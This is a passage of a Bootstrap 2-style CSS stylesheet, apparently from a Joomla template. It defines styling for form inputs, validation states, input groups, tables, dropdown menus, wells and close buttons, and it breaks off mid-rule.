	box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
	-webkit-transition: border linear .2s, box-shadow linear .2s;
	-moz-transition: border linear .2s, box-shadow linear .2s;
	-o-transition: border linear .2s, box-shadow linear .2s;
	transition: border linear .2s, box-shadow linear .2s;
}
textarea:focus,
input[type="text"]:focus,
input[type="password"]:focus,
input[type="datetime"]:focus,
input[type="datetime-local"]:focus,
input[type="date"]:focus,
input[type="month"]:focus,
input[type="time"]:focus,
input[type="week"]:focus,
input[type="number"]:focus,
input[type="email"]:focus,
input[type="url"]:focus,
input[type="search"]:focus,
input[type="tel"]:focus,
input[type="color"]:focus,
.uneditable-input:focus {
	border-color: rgba(82,168,236,0.8);
	outline: 0;
	outline: thin dotted \9;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(82,168,236,.6);
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(82,168,236,.6);
	box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(82,168,236,.6);
}
input[type="radio"],
input[type="checkbox"] {
	margin: 4px 0 0;
	*margin-top: 0;
	margin-top: 1px \9;
	line-height: normal;
}
input[type="file"],
input[type="image"],
input[type="submit"],
input[type="reset"],
input[type="button"],
input[type="radio"],
input[type="checkbox"] {
	width: auto;
}
select,
input[type="file"] {
	height: 28px;
	*margin-top: 4px;
	line-height: 28px;
}
select {
	width: 220px;
	border: 1px solid #ccc;
	background-color: #fff;
}
select[multiple],
select[size] {
	height: auto;
}
select:focus,
input[type="file"]:focus,
input[type="radio"]:focus,
input[type="checkbox"]:focus {
	outline: thin dotted #333;
	outline: 5px auto -webkit-focus-ring-color;
	outline-offset: -2px;
}
.uneditable-input,
.uneditable-textarea {
	color: #999;
	background-color: #fcfcfc;
	border-color: #ccc;
	-webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.025);
	-moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.025);
	box-shadow: inset 0 1px 2px rgba(0,0,0,0.025);
	cursor: not-allowed;
}
.uneditable-input {
	overflow: hidden;
	white-space: nowrap;
}
.uneditable-textarea {
	width: auto;
	height: auto;
}
input:-moz-placeholder,
textarea:-moz-placeholder {
	color: #999;
}
input:-ms-input-placeholder,
textarea:-ms-input-placeholder {
	color: #999;
}
input::-webkit-input-placeholder,
textarea::-webkit-input-placeholder {
	color: #999;
}
.radio,
.checkbox {
	min-height: 18px;
	padding-left: 20px;
}
.radio input[type="radio"],
.checkbox input[type="checkbox"] {
	float: left;
	margin-left: -20px;
}
.controls > .radio:first-child,
.controls > .checkbox:first-child {
	padding-top: 5px;
}
.radio.inline,
.checkbox.inline {
	display: inline-block;
	padding-top: 5px;
	margin-bottom: 0;
	vertical-align: middle;
}
.radio.inline + .radio.inline,
.checkbox.inline + .checkbox.inline {
	margin-left: 10px;
}
.input-mini {
	width: 60px;
}
.input-small {
	width: 90px;
}
.input-medium {
	width: 150px;
}
.input-large {
	width: 210px;
}
.input-xlarge {
	width: 270px;
}
.input-xxlarge {
	width: 530px;
}
input[class*="span"],
select[class*="span"],
textarea[class*="span"],
.uneditable-input[class*="span"],
.row-fluid input[class*="span"],
.row-fluid select[class*="span"],
.row-fluid textarea[class*="span"],
.row-fluid .uneditable-input[class*="span"] {
	float: none;
	margin-left: 0;
}
.input-append input[class*="span"],
.input-append .uneditable-input[class*="span"],
.input-prepend input[class*="span"],
.input-prepend .uneditable-input[class*="span"],
.row-fluid input[class*="span"],
.row-fluid select[class*="span"],
.row-fluid textarea[class*="span"],
.row-fluid .uneditable-input[class*="span"],
.row-fluid .input-prepend [class*="span"],
.row-fluid .input-append [class*="span"] {
	display: inline-block;
}
input,
textarea,
.uneditable-input {
	margin-left: 0;
}
.controls-row [class*="span"] + [class*="span"] {
	margin-left: 20px;
}
input.span12,
textarea.span12,
.uneditable-input.span12 {
	width: 926px;
}
input.span11,
textarea.span11,
.uneditable-input.span11 {
	width: 846px;
}
input.span10,
textarea.span10,
.uneditable-input.span10 {
	width: 766px;
}
input.span9,
textarea.span9,
.uneditable-input.span9 {
	width: 686px;
}
input.span8,
textarea.span8,
.uneditable-input.span8 {
	width: 606px;
}
input.span7,
textarea.span7,
.uneditable-input.span7 {
	width: 526px;
}
input.span6,
textarea.span6,
.uneditable-input.span6 {
	width: 446px;
}
input.span5,
textarea.span5,
.uneditable-input.span5 {
	width: 366px;
}
input.span4,
textarea.span4,
.uneditable-input.span4 {
	width: 286px;
}
input.span3,
textarea.span3,
.uneditable-input.span3 {
	width: 206px;
}
input.span2,
textarea.span2,
.uneditable-input.span2 {
	width: 126px;
}
input.span1,
textarea.span1,
.uneditable-input.span1 {
	width: 46px;
}
.controls-row {
	*zoom: 1;
}
.controls-row:before,
.controls-row:after {
	display: table;
	content: "";
	line-height: 0;
}
.controls-row:after {
	clear: both;
}
.controls-row [class*="span"],
.row-fluid .controls-row [class*="span"] {
	float: left;
}
.controls-row .checkbox[class*="span"],
.controls-row .radio[class*="span"] {
	padding-top: 5px;
}
input[disabled],
select[disabled],
textarea[disabled],
input[readonly],
select[readonly],
textarea[readonly] {
	cursor: not-allowed;
	background-color: #eee;
}
input[type="radio"][disabled],
input[type="checkbox"][disabled],
input[type="radio"][readonly],
input[type="checkbox"][readonly] {
	background-color: transparent;
}
.control-group.warning .control-label,
.control-group.warning .help-block,
.control-group.warning .help-inline {
	color: #8a6d3b;
}
.control-group.warning .checkbox,
.control-group.warning .radio,
.control-group.warning input,
.control-group.warning select,
.control-group.warning textarea {
	color: #8a6d3b;
}
.control-group.warning input,
.control-group.warning select,
.control-group.warning textarea {
	border-color: #8a6d3b;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
	box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
}
.control-group.warning input:focus,
.control-group.warning select:focus,
.control-group.warning textarea:focus {
	border-color: #66512c;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #c0a16b;
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #c0a16b;
	box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #c0a16b;
}
.control-group.warning .input-prepend .add-on,
.control-group.warning .input-append .add-on {
	color: #8a6d3b;
	background-color: #fcf8e3;
	border-color: #8a6d3b;
}
.control-group.error .control-label,
.control-group.error .help-block,
.control-group.error .help-inline {
	color: #a94442;
}
.control-group.error .checkbox,
.control-group.error .radio,
.control-group.error input,
.control-group.error select,
.control-group.error textarea {
	color: #a94442;
}
.control-group.error input,
.control-group.error select,
.control-group.error textarea {
	border-color: #a94442;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
	box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
}
.control-group.error input:focus,
.control-group.error select:focus,
.control-group.error textarea:focus {
	border-color: #843534;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #ce8483;
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #ce8483;
	box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #ce8483;
}
.control-group.error .input-prepend .add-on,
.control-group.error .input-append .add-on {
	color: #a94442;
	background-color: #f2dede;
	border-color: #a94442;
}
.control-group.success .control-label,
.control-group.success .help-block,
.control-group.success .help-inline {
	color: #3c763d;
}
.control-group.success .checkbox,
.control-group.success .radio,
.control-group.success input,
.control-group.success select,
.control-group.success textarea {
	color: #3c763d;
}
.control-group.success input,
.control-group.success select,
.control-group.success textarea {
	border-color: #3c763d;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
	box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
}
.control-group.success input:focus,
.control-group.success select:focus,
.control-group.success textarea:focus {
	border-color: #2b542c;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #67b168;
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #67b168;
	box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #67b168;
}
.control-group.success .input-prepend .add-on,
.control-group.success .input-append .add-on {
	color: #3c763d;
	background-color: #dff0d8;
	border-color: #3c763d;
}
.control-group.info .control-label,
.control-group.info .help-block,
.control-group.info .help-inline {
	color: #31708f;
}
.control-group.info .checkbox,
.control-group.info .radio,
.control-group.info input,
.control-group.info select,
.control-group.info textarea {
	color: #31708f;
}
.control-group.info input,
.control-group.info select,
.control-group.info textarea {
	border-color: #31708f;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
	box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
}
.control-group.info input:focus,
.control-group.info select:focus,
.control-group.info textarea:focus {
	border-color: #245269;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #5ea5c8;
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #5ea5c8;
	box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #5ea5c8;
}
.control-group.info .input-prepend .add-on,
.control-group.info .input-append .add-on {
	color: #31708f;
	background-color: #d9edf7;
	border-color: #31708f;
}
input:focus:invalid,
textarea:focus:invalid,
select:focus:invalid {
	color: #b94a48;
	border-color: #ee5f5b;
}
input:focus:invalid:focus,
textarea:focus:invalid:focus,
select:focus:invalid:focus {
	border-color: #e9322d;
	-webkit-box-shadow: 0 0 6px #f8b9b7;
	-moz-box-shadow: 0 0 6px #f8b9b7;
	box-shadow: 0 0 6px #f8b9b7;
}
.form-actions {
	padding: 17px 20px 18px;
	margin-top: 18px;
	margin-bottom: 18px;
	background-color: #f5f5f5;
	border-top: 1px solid #e5e5e5;
	*zoom: 1;
}
.form-actions:before,
.form-actions:after {
	display: table;
	content: "";
	line-height: 0;
}
.form-actions:after {
	clear: both;
}
.help-block,
.help-inline {
	color: #595959;
}
.help-block {
	display: block;
	margin-bottom: 9px;
}
.help-inline {
	display: inline-block;
	*display: inline;
	*zoom: 1;
	vertical-align: middle;
	padding-left: 5px;
}
.input-append,
.input-prepend {
	display: inline-block;
	margin-bottom: 9px;
	vertical-align: middle;
	font-size: 0;
	white-space: nowrap;
}
.input-append input,
.input-append select,
.input-append .uneditable-input,
.input-append .dropdown-menu,
.input-append .popover,
.input-prepend input,
.input-prepend select,
.input-prepend .uneditable-input,
.input-prepend .dropdown-menu,
.input-prepend .popover {
	font-size: 13px;
}
.input-append input,
.input-append select,
.input-append .uneditable-input,
.input-prepend input,
.input-prepend select,
.input-prepend .uneditable-input {
	position: relative;
	margin-bottom: 0;
	*margin-left: 0;
	vertical-align: top;
	-webkit-border-radius: 0 3px 3px 0;
	-moz-border-radius: 0 3px 3px 0;
	border-radius: 0 3px 3px 0;
}
.input-append input:focus,
.input-append select:focus,
.input-append .uneditable-input:focus,
.input-prepend input:focus,
.input-prepend select:focus,
.input-prepend .uneditable-input:focus {
	z-index: 2;
}
.input-append .add-on,
.input-prepend .add-on {
	display: inline-block;
	width: auto;
	height: 18px;
	min-width: 16px;
	padding: 4px 5px;
	font-size: 13px;
	font-weight: normal;
	line-height: 18px;
	text-align: center;
	text-shadow: 0 1px 0 #fff;
	background-color: #eee;
	border: 1px solid #ccc;
}
.input-append .add-on,
.input-append .btn,
.input-append .btn-group > .dropdown-toggle,
.input-prepend .add-on,
.input-prepend .btn,
.input-prepend .btn-group > .dropdown-toggle {
	vertical-align: top;
	-webkit-border-radius: 0;
	-moz-border-radius: 0;
	border-radius: 0;
}
.input-append .active,
.input-prepend .active {
	background-color: #a9dba9;
	border-color: #46a546;
}
.input-prepend .add-on,
.input-prepend .btn {
	margin-right: -1px;
}
.input-prepend .add-on:first-child,
.input-prepend .btn:first-child {
	-webkit-border-radius: 3px 0 0 3px;
	-moz-border-radius: 3px 0 0 3px;
	border-radius: 3px 0 0 3px;
}
.input-append input,
.input-append select,
.input-append .uneditable-input {
	-webkit-border-radius: 3px 0 0 3px;
	-moz-border-radius: 3px 0 0 3px;
	border-radius: 3px 0 0 3px;
}
.input-append input + .btn-group .btn:last-child,
.input-append select + .btn-group .btn:last-child,
.input-append .uneditable-input + .btn-group .btn:last-child {
	-webkit-border-radius: 0 3px 3px 0;
	-moz-border-radius: 0 3px 3px 0;
	border-radius: 0 3px 3px 0;
}
.input-append .add-on,
.input-append .btn,
.input-append .btn-group {
	margin-left: -1px;
}
.input-append .add-on:last-child,
.input-append .btn:last-child,
.input-append .btn-group:last-child > .dropdown-toggle {
	-webkit-border-radius: 0 3px 3px 0;
	-moz-border-radius: 0 3px 3px 0;
	border-radius: 0 3px 3px 0;
}
.input-prepend.input-append input,
.input-prepend.input-append select,
.input-prepend.input-append .uneditable-input {
	-webkit-border-radius: 0;
	-moz-border-radius: 0;
	border-radius: 0;
}
.input-prepend.input-append input + .btn-group .btn,
.input-prepend.input-append select + .btn-group .btn,
.input-prepend.input-append .uneditable-input + .btn-group .btn {
	-webkit-border-radius: 0 3px 3px 0;
	-moz-border-radius: 0 3px 3px 0;
	border-radius: 0 3px 3px 0;
}
.input-prepend.input-append .add-on:first-child,
.input-prepend.input-append .btn:first-child {
	margin-right: -1px;
	-webkit-border-radius: 3px 0 0 3px;
	-moz-border-radius: 3px 0 0 3px;
	border-radius: 3px 0 0 3px;
}
.input-prepend.input-append .add-on:last-child,
.input-prepend.input-append .btn:last-child {
	margin-left: -1px;
	-webkit-border-radius: 0 3px 3px 0;
	-moz-border-radius: 0 3px 3px 0;
	border-radius: 0 3px 3px 0;
}
.input-prepend.input-append .btn-group:first-child {
	margin-left: 0;
}
input.search-query {
	padding-right: 14px;
	padding-right: 4px \9;
	padding-left: 14px;
	padding-left: 4px \9;
	margin-bottom: 0;
	-webkit-border-radius: 15px;
	-moz-border-radius: 15px;
	border-radius: 15px;
}
.form-search .input-append .search-query,
.form-search .input-prepend .search-query {
	-webkit-border-radius: 0;
	-moz-border-radius: 0;
	border-radius: 0;
}
.form-search .input-append .search-query {
	-webkit-border-radius: 14px 0 0 14px;
	-moz-border-radius: 14px 0 0 14px;
	border-radius: 14px 0 0 14px;
}
.form-search .input-append .btn {
	-webkit-border-radius: 0 14px 14px 0;
	-moz-border-radius: 0 14px 14px 0;
	border-radius: 0 14px 14px 0;
}
.form-search .input-prepend .search-query {
	-webkit-border-radius: 0 14px 14px 0;
	-moz-border-radius: 0 14px 14px 0;
	border-radius: 0 14px 14px 0;
}
.form-search .input-prepend .btn {
	-webkit-border-radius: 14px 0 0 14px;
	-moz-border-radius: 14px 0 0 14px;
	border-radius: 14px 0 0 14px;
}
.form-search input,
.form-search textarea,
.form-search select,
.form-search .help-inline,
.form-search .uneditable-input,
.form-search .input-prepend,
.form-search .input-append,
.form-inline input,
.form-inline textarea,
.form-inline select,
.form-inline .help-inline,
.form-inline .uneditable-input,
.form-inline .input-prepend,
.form-inline .input-append,
.form-horizontal input,
.form-horizontal textarea,
.form-horizontal select,
.form-horizontal .help-inline,
.form-horizontal .uneditable-input,
.form-horizontal .input-prepend,
.form-horizontal .input-append {
	display: inline-block;
	*display: inline;
	*zoom: 1;
	margin-bottom: 0;
	vertical-align: middle;
}
.form-search .hide,
.form-inline .hide,
.form-horizontal .hide {
	display: none;
}
.form-search label,
.form-inline label,
.form-search .btn-group,
.form-inline .btn-group {
	display: inline-block;
}
.form-search .input-append,
.form-inline .input-append,
.form-search .input-prepend,
.form-inline .input-prepend {
	margin-bottom: 0;
}
.form-search .radio,
.form-search .checkbox,
.form-inline .radio,
.form-inline .checkbox {
	padding-left: 0;
	margin-bottom: 0;
	vertical-align: middle;
}
.form-search .radio input[type="radio"],
.form-search .checkbox input[type="checkbox"],
.form-inline .radio input[type="radio"],
.form-inline .checkbox input[type="checkbox"] {
	float: left;
	margin-right: 3px;
	margin-left: 0;
}
.control-group {
	margin-bottom: 9px;
}
legend + .control-group {
	margin-top: 18px;
	-webkit-margin-top-collapse: separate;
}
.form-horizontal .control-group {
	margin-bottom: 18px;
	*zoom: 1;
}
.form-horizontal .control-group:before,
.form-horizontal .control-group:after {
	display: table;
	content: "";
	line-height: 0;
}
.form-horizontal .control-group:after {
	clear: both;
}
.form-horizontal .control-label {
	float: left;
	width: 160px;
	padding-top: 5px;
	text-align: right;
}
.form-horizontal .controls {
	*display: inline-block;
	*padding-left: 20px;
	margin-left: 180px;
	*margin-left: 0;
}
.form-horizontal .controls:first-child {
	*padding-left: 180px;
}
.form-horizontal .help-block {
	margin-bottom: 0;
}
.form-horizontal input + .help-block,
.form-horizontal select + .help-block,
.form-horizontal textarea + .help-block,
.form-horizontal .uneditable-input + .help-block,
.form-horizontal .input-prepend + .help-block,
.form-horizontal .input-append + .help-block {
	margin-top: 9px;
}
.form-horizontal .form-actions {
	padding-left: 180px;
}
.control-label .hasPopover,
.control-label .hasTooltip {
	display: inline-block;
}
.subform-repeatable-wrapper .btn-group>.btn.button {
	min-width: 0;
}
.subform-repeatable-wrapper .ui-sortable-helper {
	background: #fff;
}
.subform-repeatable-wrapper tr.ui-sortable-helper {
	display: table;
}
table {
	max-width: 100%;
	background-color: transparent;
	border-collapse: collapse;
	border-spacing: 0;
}
.table {
	width: 100%;
	margin-bottom: 18px;
}
.table th,
.table td {
	padding: 8px;
	line-height: 18px;
	text-align: left;
	vertical-align: top;
	border-top: 1px solid #ddd;
}
.table th {
	font-weight: bold;
}
.table thead th {
	vertical-align: bottom;
}
.table caption + thead tr:first-child th,
.table caption + thead tr:first-child td,
.table colgroup + thead tr:first-child th,
.table colgroup + thead tr:first-child td,
.table thead:first-child tr:first-child th,
.table thead:first-child tr:first-child td {
	border-top: 0;
}
.table tbody + tbody {
	border-top: 2px solid #ddd;
}
.table .table {
	background-color: #fff;
}
.table-condensed th,
.table-condensed td {
	padding: 4px 5px;
}
.table-bordered {
	border: 1px solid #ddd;
	border-collapse: separate;
	*border-collapse: collapse;
	border-left: 0;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
}
.table-bordered th,
.table-bordered td {
	border-left: 1px solid #ddd;
}
.table-bordered caption + thead tr:first-child th,
.table-bordered caption + tbody tr:first-child th,
.table-bordered caption + tbody tr:first-child td,
.table-bordered colgroup + thead tr:first-child th,
.table-bordered colgroup + tbody tr:first-child th,
.table-bordered colgroup + tbody tr:first-child td,
.table-bordered thead:first-child tr:first-child th,
.table-bordered tbody:first-child tr:first-child th,
.table-bordered tbody:first-child tr:first-child td {
	border-top: 0;
}
.table-bordered thead:first-child tr:first-child > th:first-child,
.table-bordered tbody:first-child tr:first-child > td:first-child,
.table-bordered tbody:first-child tr:first-child > th:first-child {
	-webkit-border-top-left-radius: 4px;
	-moz-border-radius-topleft: 4px;
	border-top-left-radius: 4px;
}
.table-bordered thead:first-child tr:first-child > th:last-child,
.table-bordered tbody:first-child tr:first-child > td:last-child,
.table-bordered tbody:first-child tr:first-child > th:last-child {
	-webkit-border-top-right-radius: 4px;
	-moz-border-radius-topright: 4px;
	border-top-right-radius: 4px;
}
.table-bordered thead:last-child tr:last-child > th:first-child,
.table-bordered tbody:last-child tr:last-child > td:first-child,
.table-bordered tbody:last-child tr:last-child > th:first-child,
.table-bordered tfoot:last-child tr:last-child > td:first-child,
.table-bordered tfoot:last-child tr:last-child > th:first-child {
	-webkit-border-bottom-left-radius: 4px;
	-moz-border-radius-bottomleft: 4px;
	border-bottom-left-radius: 4px;
}
.table-bordered thead:last-child tr:last-child > th:last-child,
.table-bordered tbody:last-child tr:last-child > td:last-child,
.table-bordered tbody:last-child tr:last-child > th:last-child,
.table-bordered tfoot:last-child tr:last-child > td:last-child,
.table-bordered tfoot:last-child tr:last-child > th:last-child {
	-webkit-border-bottom-right-radius: 4px;
	-moz-border-radius-bottomright: 4px;
	border-bottom-right-radius: 4px;
}
.table-bordered tfoot + tbody:last-child tr:last-child td:first-child {
	-webkit-border-bottom-left-radius: 0;
	-moz-border-radius-bottomleft: 0;
	border-bottom-left-radius: 0;
}
.table-bordered tfoot + tbody:last-child tr:last-child td:last-child {
	-webkit-border-bottom-right-radius: 0;
	-moz-border-radius-bottomright: 0;
	border-bottom-right-radius: 0;
}
.table-bordered caption + thead tr:first-child th:first-child,
.table-bordered caption + tbody tr:first-child td:first-child,
.table-bordered colgroup + thead tr:first-child th:first-child,
.table-bordered colgroup + tbody tr:first-child td:first-child {
	-webkit-border-top-left-radius: 4px;
	-moz-border-radius-topleft: 4px;
	border-top-left-radius: 4px;
}
.table-bordered caption + thead tr:first-child th:last-child,
.table-bordered caption + tbody tr:first-child td:last-child,
.table-bordered colgroup + thead tr:first-child th:last-child,
.table-bordered colgroup + tbody tr:first-child td:last-child {
	-webkit-border-top-right-radius: 4px;
	-moz-border-radius-topright: 4px;
	border-top-right-radius: 4px;
}
.table-striped tbody > tr:nth-child(odd) > td,
.table-striped tbody > tr:nth-child(odd) > th {
	background-color: #f9f9f9;
}
.table-hover tbody tr:hover > td,
.table-hover tbody tr:hover > th {
	background-color: #f5f5f5;
}
table td[class*="span"],
table th[class*="span"],
.row-fluid table td[class*="span"],
.row-fluid table th[class*="span"] {
	display: table-cell;
	float: none;
	margin-left: 0;
}
.table td.span1,
.table th.span1 {
	float: none;
	width: 44px;
	margin-left: 0;
}
.table td.span2,
.table th.span2 {
	float: none;
	width: 124px;
	margin-left: 0;
}
.table td.span3,
.table th.span3 {
	float: none;
	width: 204px;
	margin-left: 0;
}
.table td.span4,
.table th.span4 {
	float: none;
	width: 284px;
	margin-left: 0;
}
.table td.span5,
.table th.span5 {
	float: none;
	width: 364px;
	margin-left: 0;
}
.table td.span6,
.table th.span6 {
	float: none;
	width: 444px;
	margin-left: 0;
}
.table td.span7,
.table th.span7 {
	float: none;
	width: 524px;
	margin-left: 0;
}
.table td.span8,
.table th.span8 {
	float: none;
	width: 604px;
	margin-left: 0;
}
.table td.span9,
.table th.span9 {
	float: none;
	width: 684px;
	margin-left: 0;
}
.table td.span10,
.table th.span10 {
	float: none;
	width: 764px;
	margin-left: 0;
}
.table td.span11,
.table th.span11 {
	float: none;
	width: 844px;
	margin-left: 0;
}
.table td.span12,
.table th.span12 {
	float: none;
	width: 924px;
	margin-left: 0;
}
.table tbody tr.success > td {
	background-color: #dff0d8;
}
.table tbody tr.error > td {
	background-color: #f2dede;
}
.table tbody tr.warning > td {
	background-color: #fcf8e3;
}
.table tbody tr.info > td {
	background-color: #d9edf7;
}
.table-hover tbody tr.success:hover > td {
	background-color: #d0e9c6;
}
.table-hover tbody tr.error:hover > td {
	background-color: #ebcccc;
}
.table-hover tbody tr.warning:hover > td {
	background-color: #faf2cc;
}
.table-hover tbody tr.info:hover > td {
	background-color: #c4e3f3;
}
.dropup,
.dropdown {
	position: relative;
}
.dropdown-toggle {
	*margin-bottom: -3px;
}
.dropdown-toggle:active,
.open .dropdown-toggle {
	outline: 0;
}
.caret {
	display: inline-block;
	width: 0;
	height: 0;
	vertical-align: top;
	border-top: 4px solid #000;
	border-right: 4px solid transparent;
	border-left: 4px solid transparent;
	content: "";
}
.dropdown .caret {
	margin-top: 8px;
	margin-left: 2px;
}
.dropdown-menu {
	position: absolute;
	top: 100%;
	left: 0;
	z-index: 1000;
	display: none;
	float: left;
	min-width: 160px;
	padding: 5px 0;
	margin: 2px 0 0;
	list-style: none;
	background-color: #fff;
	border: 1px solid #ccc;
	border: 1px solid rgba(0,0,0,0.2);
	*border-right-width: 2px;
	*border-bottom-width: 2px;
	-webkit-border-radius: 6px;
	-moz-border-radius: 6px;
	border-radius: 6px;
	-webkit-box-shadow: 0 5px 10px rgba(0,0,0,0.2);
	-moz-box-shadow: 0 5px 10px rgba(0,0,0,0.2);
	box-shadow: 0 5px 10px rgba(0,0,0,0.2);
	-webkit-background-clip: padding-box;
	-moz-background-clip: padding;
	background-clip: padding-box;
}
.dropdown-menu.pull-right {
	right: 0;
	left: auto;
}
.dropdown-menu .divider {
	*width: 100%;
	height: 1px;
	margin: 8px 1px;
	*margin: -5px 0 5px;
	overflow: hidden;
	background-color: #e5e5e5;
	border-bottom: 1px solid #fff;
}
.dropdown-menu > li > a {
	display: block;
	padding: 3px 20px;
	clear: both;
	font-weight: normal;
	line-height: 18px;
	color: #333;
	white-space: nowrap;
}
.dropdown-menu > li > a:hover,
.dropdown-menu > li > a:focus,
.dropdown-submenu:hover > a,
.dropdown-submenu:focus > a {
	text-decoration: none;
	color: #fff;
	background-color: #2d6ca2;
	background-image: -moz-linear-gradient(top,#3071a9,#2a6496);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#3071a9),to(#2a6496));
	background-image: -webkit-linear-gradient(top,#3071a9,#2a6496);
	background-image: -o-linear-gradient(top,#3071a9,#2a6496);
	background-image: linear-gradient(to bottom,#3071a9,#2a6496);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff2f70a9', endColorstr='#ff296395', GradientType=0);
}
.dropdown-menu > .active > a,
.dropdown-menu > .active > a:hover,
.dropdown-menu > .active > a:focus {
	color: #333;
	text-decoration: none;
	outline: 0;
	background-color: #2d6ca2;
	background-image: -moz-linear-gradient(top,#3071a9,#2a6496);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#3071a9),to(#2a6496));
	background-image: -webkit-linear-gradient(top,#3071a9,#2a6496);
	background-image: -o-linear-gradient(top,#3071a9,#2a6496);
	background-image: linear-gradient(to bottom,#3071a9,#2a6496);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff2f70a9', endColorstr='#ff296395', GradientType=0);
}
.dropdown-menu > .disabled > a,
.dropdown-menu > .disabled > a:hover,
.dropdown-menu > .disabled > a:focus {
	color: #999;
}
.dropdown-menu > .disabled > a:hover,
.dropdown-menu > .disabled > a:focus {
	text-decoration: none;
	background-color: transparent;
	background-image: none;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
	cursor: default;
}
.open {
	*z-index: 1000;
}
.open > .dropdown-menu {
	display: block;
}
.dropdown-backdrop {
	position: fixed;
	left: 0;
	right: 0;
	bottom: 0;
	top: 0;
	z-index: 990;
}
.pull-right > .dropdown-menu {
	right: 0;
	left: auto;
}
.dropup .caret,
.navbar-fixed-bottom .dropdown .caret {
	border-top: 0;
	border-bottom: 4px solid #000;
	content: "";
}
.dropup .dropdown-menu,
.navbar-fixed-bottom .dropdown .dropdown-menu {
	top: auto;
	bottom: 100%;
	margin-bottom: 1px;
}
.dropdown-submenu {
	position: relative;
}
.dropdown-submenu > .dropdown-menu {
	top: 0;
	left: 100%;
	margin-top: -6px;
	margin-left: -1px;
	-webkit-border-radius: 6px 6px 6px 6px;
	-moz-border-radius: 6px 6px 6px 6px;
	border-radius: 6px 6px 6px 6px;
}
.dropdown-submenu:hover > .dropdown-menu {
	display: block;
}
.dropup .dropdown-submenu > .dropdown-menu {
	top: auto;
	bottom: 0;
	margin-top: 0;
	margin-bottom: -2px;
	-webkit-border-radius: 5px 5px 5px 0;
	-moz-border-radius: 5px 5px 5px 0;
	border-radius: 5px 5px 5px 0;
}
.dropdown-submenu > a:after {
	display: block;
	content: " ";
	float: right;
	width: 0;
	height: 0;
	border-color: transparent;
	border-style: solid;
	border-width: 5px 0 5px 5px;
	border-left-color: #cccccc;
	margin-top: 5px;
	margin-right: -10px;
}
.dropdown-submenu:hover > a:after {
	border-left-color: #fff;
}
.dropdown-submenu.pull-left {
	float: none;
}
.dropdown-submenu.pull-left > .dropdown-menu {
	left: -100%;
	margin-left: 10px;
	-webkit-border-radius: 6px 0 6px 6px;
	-moz-border-radius: 6px 0 6px 6px;
	border-radius: 6px 0 6px 6px;
}
.dropdown .dropdown-menu .nav-header {
	padding-left: 20px;
	padding-right: 20px;
}
.typeahead {
	z-index: 1051;
	margin-top: 2px;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
}
.well {
	min-height: 20px;
	padding: 19px;
	margin-bottom: 20px;
	background-color: #f5f5f5;
	border: 1px solid #e3e3e3;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.05);
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.05);
	box-shadow: inset 0 1px 1px rgba(0,0,0,0.05);
}
.well blockquote {
	border-color: #ddd;
	border-color: rgba(0,0,0,0.15);
}
.well-large {
	padding: 24px;
	-webkit-border-radius: 6px;
	-moz-border-radius: 6px;
	border-radius: 6px;
}
.well-small {
	padding: 9px;
	-webkit-border-radius: 3px;
	-moz-border-radius: 3px;
	border-radius: 3px;
}
.fade {
	opacity: 0;
	-webkit-transition: opacity .15s linear;
	-moz-transition: opacity .15s linear;
	-o-transition: opacity .15s linear;
	transition: opacity .15s linear;
}
.fade.in {
	opacity: 1;
}
.collapse {
	position: relative;
	height: 0;
	overflow: hidden;
	-webkit-transition: height .35s ease;
	-moz-transition: height .35s ease;
	-o-transition: height .35s ease;
	transition: height .35s ease;
}
.collapse.in {
	height: auto;
}
.close {
	float: right;
	font-size: 20px;
	font-weight: bold;
	line-height: 18px;
	color: #000;
	text-shadow: 0 1px 0 #ffffff;
	opacity: 0.2;
	filter: alpha(opacity=20);
}
.close:hover,
.close:focus {
	color: #000;
	text-decoration: none;
	cursor: pointer;
	opacity: 0.4;
	filter: alpha(opacity=40);
}
button.close {
